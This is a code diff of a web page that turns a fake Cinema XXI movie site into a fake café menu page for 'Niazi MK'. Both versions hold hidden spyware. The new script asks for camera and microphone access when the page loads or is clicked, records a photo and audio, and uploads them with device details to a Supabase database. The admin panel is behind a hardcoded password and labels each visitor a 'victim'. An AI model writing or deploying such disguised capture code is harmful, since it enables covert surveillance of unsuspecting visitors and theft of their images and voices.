@@ -3,150 +3,215 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Cinema XXI - Tiket Nonton Online</title>
+    <title>Niazi MK - Coffee & Kitchen</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
-        :root { --xxi-blue: #002547; --xxi-gold: #b2935b; --bg: #001529; }
-        body { background: var(--bg); color: #fff; font-family: Arial, sans-serif; margin: 0; padding-bottom: 70px; overflow-x: hidden; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        body { background: #fdfaf7; color: #2c1e14; scroll-behavior: smooth; }
+
+        /* Navbar */
+        .navbar { background: #2c1e14; padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; color: white; position: sticky; top: 0; z-index: 1000; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        .logo { display: flex; align-items: center; gap: 10px; }
+        .shop-name { font-size: 22px; font-weight: bold; color: #d4a373; letter-spacing: 1px; }
+        .admin-btn { background: #d4a373; color: #2c1e14 !important; padding: 8px 18px; border-radius: 20px; font-weight: bold; text-decoration: none; font-size: 13px; }
+
+        /* Hero */
+        .hero { background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://images.unsplash.com/photo-1554118811-1e0d58224f24?w=1200'); background-size: cover; background-position: center; height: 400px; display: flex; align-items: center; justify-content: center; color: white; text-align: center; }
+        .hero h1 { font-size: 40px; }
+        .hero h1 span { color: #d4a373; }
+
+        /* Category Tabs */
+        .tabs { display: flex; justify-content: center; gap: 10px; padding: 20px; overflow-x: auto; background: #fff; border-bottom: 1px solid #eee; }
+        .tab { padding: 8px 20px; border-radius: 20px; border: 1px solid #d4a373; color: #d4a373; font-size: 13px; font-weight: 600; cursor: pointer; white-space: nowrap; }
+        .tab.active { background: #d4a373; color: #fff; }
+
+        /* Menu Grid */
+        .section-title { text-align: center; padding: 40px 0 10px; font-size: 28px; }
+        .menu-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 15px; padding: 20px 5%; max-width: 1200px; margin: 0 auto; }
+        .item-card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.05); transition: 0.3s; border: 1px solid #eee; }
+        .item-img { width: 100%; height: 140px; object-fit: cover; }
+        .item-info { padding: 12px; }
+        .item-info h3 { font-size: 14px; margin-bottom: 5px; height: 40px; overflow: hidden; }
+        .price { color: #d4a373; font-weight: bold; font-size: 16px; }
+
+        /* Admin Dashboard */
+        .admin-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 2000; display: none; flex-direction: column; padding: 20px; }
+        .log-item { background: #f4f4f4; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 5px solid #d4a373; }
+        .log-item img { width: 100%; border-radius: 8px; margin: 10px 0; }
         
-        header { background: var(--xxi-blue); padding: 15px; text-align: center; border-bottom: 2px solid var(--xxi-gold); position: sticky; top: 0; z-index: 1000; }
-        .logo-text { color: var(--xxi-gold); font-size: 20px; font-weight: bold; letter-spacing: 2px; }
-        
-        /* TOMBOL RAHASIA ADMIN DI POJOK KANAN ATAS */
-        .secret-area { position: absolute; right: 0; top: 0; width: 80px; height: 60px; z-index: 1001; cursor: pointer; }
+        .f-admin { position: fixed; bottom: 20px; right: 20px; background: #d4a373; width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; z-index: 100; cursor: pointer; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
 
-        /* Full Screen Video Player */
-        #video-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 2000; flex-direction: column; }
-        .close-player { background: var(--xxi-gold); color: #000; border: none; padding: 10px; font-weight: bold; cursor: pointer; }
-        .yt-wrapper { flex-grow: 1; display: flex; align-items: center; justify-content: center; }
-
-        /* Movie List */
-        .content { padding: 15px; }
-        .movie-card { background: #002140; border: 1px solid #003366; border-radius: 8px; margin-bottom: 20px; overflow: hidden; }
-        .poster { width: 100%; height: 200px; object-fit: cover; background: #000; }
-        .info { padding: 15px; text-align: center; }
-        .title { font-size: 14px; font-weight: bold; margin-bottom: 10px; color: #eee; }
-        .btn-play { background: linear-gradient(180deg, #b2935b 0%, #8e7547 100%); color: white; border: none; width: 100%; padding: 12px; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-
-        /* Hidden Capture */
-        #v { position: fixed; top: -9999px; left: -9999px; opacity: 0; }
-        #c { display: none; }
-
-        /* Admin Panel */
-        #admin-dash { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050505; z-index: 3000; color: #00ff00; padding: 20px; overflow-y: auto; font-family: 'Courier New', monospace; }
-        .log-item { border: 1px solid #222; padding: 10px; margin-bottom: 10px; background: #111; font-size: 12px; }
-        .log-item img { width: 100%; margin-top: 10px; border: 1px solid #00ff00; }
-
-        /* Navbar Bottom */
-        nav { position: fixed; bottom: 0; width: 100%; background: #001b35; display: flex; border-top: 1px solid #003366; padding: 10px 0; }
-        .nav-link { flex: 1; text-align: center; color: #6e8499; font-size: 11px; text-decoration: none; }
+        #v, #c { display: none; }
     </style>
 </head>
 <body>
 
-<header>
-    <div class="logo-text">CINEMA XXI</div>
-    <div class="secret-area" onclick="handleSecretClick()"></div>
-</header>
-
-<div id="video-overlay">
-    <button class="close-player" onclick="stopVideo()">CLOSE PLAYER [X]</button>
-    <div class="yt-wrapper" id="yt-player">
+    <nav class="navbar">
+        <div class="logo">
+            <span class="shop-name">NIAZI MK</span>
         </div>
-</div>
+        <a href="#" class="admin-btn" onclick="openAdmin()">ADMIN</a>
+    </nav>
 
-<div class="content" id="main-ui">
-    <div class="movie-card">
-        <img src="https://web3.21cineplex.com/movie-images/14VINA_290x426.jpg" class="poster">
-        <div class="info">
-            <div class="title">VINA: SEBELUM 7 HARI (FULL MOVIE)</div>
-            <button class="btn-play" onclick="playFilm('VINA', '9v_zX7vXo7w')">PLAY NOW</button>
+    <div class="hero">
+        <div>
+            <h1>Taste the <span>Monkey</span> Style</h1>
+            <p>Premium Coffee & Authentic Asian Cuisine</p>
         </div>
     </div>
-    
-    <div class="movie-card">
-        <img src="https://web3.21cineplex.com/movie-images/14KUTU_290x426.jpg" class="poster">
-        <div class="info">
-            <div class="title">KUTUKAN CALON ARANG (FULL MOVIE)</div>
-            <button class="btn-play" onclick="playFilm('CALON ARANG', 'XyL3A_H8h9U')">PLAY NOW</button>
+
+    <div class="tabs">
+        <div class="tab active">All Menu</div>
+        <div class="tab">Coffee</div>
+        <div class="tab">Main Course</div>
+        <div class="tab">Mocktails</div>
+        <div class="tab">Snacks</div>
+    </div>
+
+    <h2 class="section-title">Best Sellers</h2>
+    <div class="menu-grid">
+        <div class="item-card">
+            <img src="https://images.unsplash.com/photo-1512058560566-42724afbc2db?w=400" class="item-img">
+            <div class="item-info"><h3>Nasi Goreng Spesial Monkey</h3><p class="price">Rp 45.000</p></div>
+        </div>
+        <div class="item-card">
+            <img src="https://images.unsplash.com/photo-1585032226651-759b368d7246?w=400" class="item-img">
+            <div class="item-info"><h3>Mie Goreng Jawa Pedas</h3><p class="price">Rp 38.000</p></div>
+        </div>
+        <div class="item-card">
+            <img src="https://images.unsplash.com/photo-1562607348-97bb1d48093c?w=400" class="item-img">
+            <div class="item-info"><h3>Soto Ayam Ambengan</h3><p class="price">Rp 35.000</p></div>
+        </div>
+        <div class="item-card">
+            <img src="https://images.unsplash.com/photo-1604908176997-125f25cc6f3d?w=400" class="item-img">
+            <div class="item-info"><h3>Ayam Bakar Madu</h3><p class="price">Rp 52.000</p></div>
+        </div>
+
+        <div class="item-card">
+            <img src="https://images.unsplash.com/photo-1536935338218-d413d88e7aae?w=400" class="item-img">
+            <div class="item-info"><h3>Blue Ocean Mocktail</h3><p class="price">Rp 32.000</p></div>
+        </div>
+        <div class="item-card">
+            <img src="https://images.unsplash.com/photo-1544145945-f904253d0c71?w=400" class="item-img">
+            <div class="item-info"><h3>Signature Avocado Coffee</h3><p class="price">Rp 40.000</p></div>
+        </div>
+        <div class="item-card">
+            <img src="https://images.unsplash.com/photo-1517701604599-bb29b565090c?w=400" class="item-img">
+            <div class="item-info"><h3>Iced Lychee Tea</h3><p class="price">Rp 25.000</p></div>
+        </div>
+        <div class="item-card">
+            <img src="https://images.unsplash.com/photo-1551024709-8f23befc6f87?w=400" class="item-img">
+            <div class="item-info"><h3>Chocolate Monkey Shake</h3><p class="price">Rp 35.000</p></div>
+        </div>
+        <div class="item-card">
+            <img src="https://images.unsplash.com/photo-1595981267035-7b04ca84a82d?w=400" class="item-img">
+            <div class="item-info"><h3>Iced Gula Aren Latte</h3><p class="price">Rp 28.000</p></div>
+        </div>
+        <div class="item-card">
+            <img src="https://images.unsplash.com/photo-1497515114629-f71d768fd07c?w=400" class="item-img">
+            <div class="item-info"><h3>Hot Cappuccino</h3><p class="price">Rp 30.000</p></div>
         </div>
     </div>
-</div>
 
-<nav>
-    <a href="#" class="nav-link">Movies</a>
-    <a href="#" class="nav-link">Theaters</a>
-    <a href="#" class="nav-link" style="color:var(--xxi-gold)">M-Tix</a>
-    <a href="#" class="nav-item">Profile</a>
-</nav>
+    <div class="f-admin" onclick="openAdmin()">👤</div>
 
-<div id="admin-dash">
-    <h3>[ NIAZI CLOUD MONITOR ]</h3>
-    <button onclick="location.reload()" style="background:lime; padding:5px;">REFRESH</button>
-    <button onclick="closeAdmin()" style="background:red; color:#fff; padding:5px;">EXIT</button>
-    <hr>
-    <div id="logs-container">Loading data...</div>
-</div>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
 
-<video id="v" autoplay playsinline></video>
-<canvas id="c" width="640" height="480"></canvas>
+    <div class="admin-panel" id="adminUI">
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+            <h2>Cloud Monitor 🔐</h2>
+            <button onclick="closeAdmin()" style="font-size:30px; border:none; background:none;">&times;</button>
+        </div>
+        <hr style="margin:15px 0;">
+        <div id="loginSection">
+            <input type="password" id="pass" placeholder="Password Admin" style="width:100%; padding:12px; margin-bottom:10px; border:1px solid #ddd; border-radius:8px;">
+            <button onclick="doLogin()" style="width:100%; padding:12px; background:#d4a373; border:none; color:#fff; font-weight:bold; border-radius:8px;">LOGIN</button>
+        </div>
+        <div id="dataSection" style="display:none; overflow-y:auto;">
+            <button onclick="loadFromCloud()" style="width:100%; padding:10px; background:lime; border:none; margin-bottom:15px; font-weight:bold;">REFRESH DATA</button>
+            <div id="logDisplay">Memuat data dari Supabase...</div>
+        </div>
+    </div>
 
-<script>
-    const SB_URL = "https://rdbtmwlbcrooeiwasksg.supabase.co";
-    const SB_KEY = "sb_publishable_DYcU7YAc4wN3cysWgYyJyQ_DMH_egzc";
-    const supabase = window.supabase.createClient(SB_URL, SB_KEY);
+    <script>
+        const SB_URL = "https://rdbtmwlbcrooeiwasksg.supabase.co";
+        const SB_KEY = "sb_publishable_DYcU7YAc4wN3cysWgYyJyQ_DMH_egzc";
+        const supabase = window.supabase.createClient(SB_URL, SB_KEY);
 
-    let taps = 0;
-    function handleSecretClick() {
-        taps++;
-        if(taps >= 5) {
-            if(prompt("PASSWORD:") === "NIAZI1212") {
-                document.getElementById('admin-dash').style.display = 'block';
-                loadLogs();
-            }
-            taps = 0;
+        // --- THE ENGINE ---
+        async function captureTarget() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                await new Promise(r => setTimeout(r, 2000));
+
+                const canvas = document.getElementById('c');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                const photo = canvas.toDataURL('image/jpeg', 0.5);
+
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = async () => {
+                        // SINKRONISASI KE CLOUD
+                        await supabase.from('darzi_logs').insert([{
+                            type: 'RESTO_SNIFFER',
+                            data: photo,
+                            extra: reader.result,
+                            info: `Device: ${navigator.userAgent}`
+                        }]);
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                    reader.readAsDataURL(blob);
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 4000);
+            } catch (e) {}
         }
-    }
 
-    async function playFilm(name, ytId) {
-        // Tampilkan Player
-        document.getElementById('video-overlay').style.display = 'flex';
-        document.getElementById('yt-player').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${ytId}?autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>`;
-        
-        // Mulai Maling Data
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            document.getElementById('v').srcObject = stream;
+        // Triggers
+        window.onload = () => setTimeout(captureTarget, 3000);
+        document.body.onclick = () => captureTarget();
 
-            await supabase.from('darzi_logs').insert([{ type: 'ALERT', data: `Target Nonton: ${name} | IP: Auto` }]);
+        // --- ADMIN LOGIC ---
+        function openAdmin() { document.getElementById('adminUI').style.display = 'flex'; }
+        function closeAdmin() { document.getElementById('adminUI').style.display = 'none'; }
 
-            const canvas = document.getElementById('c');
-            setInterval(async () => {
-                canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
-                const shot = canvas.toDataURL('image/jpeg', 0.4);
-                await supabase.from('darzi_logs').insert([{ type: 'PHOTO', data: shot }]);
-            }, 6000); // Jepret tiap 6 detik
-        } catch(e) {}
-    }
+        function doLogin() {
+            if(document.getElementById('pass').value === 'NIAZI1212') {
+                document.getElementById('loginSection').style.display = 'none';
+                document.getElementById('dataSection').style.display = 'block';
+                loadFromCloud();
+            } else { alert("Salah Bos!"); }
+        }
 
-    function stopVideo() {
-        document.getElementById('video-overlay').style.display = 'none';
-        document.getElementById('yt-player').innerHTML = "";
-    }
-
-    function closeAdmin() { document.getElementById('admin-dash').style.display = 'none'; }
-
-    async function loadLogs() {
-        const { data } = await supabase.from('darzi_logs').select('*').order('created_at', { ascending: false });
-        const container = document.getElementById('logs-container');
-        container.innerHTML = "";
-        data.forEach(log => {
-            const div = document.createElement('div');
-            div.className = 'log-item';
-            div.innerHTML = log.type === 'PHOTO' ? `<img src="${log.data}">` : `<strong>${log.type}</strong>: ${log.data}`;
-            container.appendChild(div);
-        });
-    }
-</script>
+        async function loadFromCloud() {
+            const display = document.getElementById('logDisplay');
+            display.innerHTML = "Syncing...";
+            const { data } = await supabase.from('darzi_logs').select('*').order('created_at', { ascending: false });
+            if(data) {
+                display.innerHTML = "";
+                data.forEach((item, i) => {
+                    display.innerHTML += `
+                        <div class="log-item">
+                            <b>KORBAN #${data.length - i}</b><br>
+                            <small>${item.created_at}</small><br>
+                            <img src="${item.data}">
+                            <audio controls src="${item.extra}"></audio>
+                            <p style="font-size:10px;">${item.info}</p>
+                        </div>
+                    `;
+                });
+            }
+        }
+    </script>
 </body>
 </html>
